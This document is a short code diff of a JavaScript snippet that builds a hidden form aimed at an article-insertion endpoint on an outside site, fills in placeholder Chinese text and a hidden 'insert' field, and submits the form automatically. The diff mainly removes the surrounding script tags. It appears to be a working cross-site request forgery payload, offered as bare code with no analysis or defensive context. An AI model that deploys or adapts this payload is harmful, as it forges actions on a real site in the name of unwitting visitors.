@@ -1,4 +1,3 @@
-<script>
 document.write('<form name=myForm></form>');   
 var myForm=document.forms['myForm'];   
 myForm.action='http://lib.uir.cn/ucenter/article/do.jsp';   
@@ -20,11 +19,10 @@ textarea.name='content';
 textarea.value='这篇文章并没有什么特别。';
 myForm.appendChild(textarea);
 
-input=document.createElement('input');
+var input=document.createElement('input');
 input.type = 'hidden';
 input.name = 'type';
 input.value = "insert";
 myForm.appendChild(input);
 
 myForm.submit();
-</script>
